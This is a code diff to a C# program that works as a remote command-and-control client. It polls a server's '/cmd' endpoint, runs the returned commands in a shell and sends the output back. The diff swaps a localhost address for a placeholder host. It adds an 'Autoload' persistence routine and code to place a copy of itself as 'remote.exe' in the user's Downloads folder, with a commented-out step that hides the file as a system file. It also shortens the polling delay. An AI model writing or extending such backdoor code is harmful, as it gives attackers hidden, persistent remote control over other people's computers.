@@ -13,8 +13,7 @@ namespace CMDCommandUsingCsharp
 {
     public class Program
     {
-
-        static string URL = "http://127.0.0.1:5000";
+        static string URL = "SITE";
         static void Autoload()
         {
             string name = "remote2";
@@ -65,6 +64,13 @@ namespace CMDCommandUsingCsharp
 
         static void Main(string[] args)
         {
+            string sourceFile = Directory.GetCurrentDirectory();
+            string targetPath =
+                Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Downloads\\remote.exe";
+            //copy
+
+            //File.SetAttributes(targetPath, FileAttributes.Hidden | FileAttributes.System);
+
             Autoload();
             string URLcmd = $"{URL}/cmd";
             /*Encoding utf8 = Encoding.GetEncoding("UTF-8");
@@ -94,21 +100,13 @@ namespace CMDCommandUsingCsharp
                     // Get the output into a string
                     string result = proc.StandardOutput.ReadToEnd();
 
-                    string path = "Example.txt";
-                    if (File.Exists(path))
-                    {
-                        TextWriter tw = new StreamWriter(path);
-                        tw.WriteLine(result);
-                        tw.Close();
-                    }
-
                     Task task1 = answer(result);
                     // Display the command output.
                     //Console.WriteLine(result);
 
                     Task task2 = clear();
                 }
-                Thread.Sleep(2000);
+                Thread.Sleep(1000);
             }
         }
     }
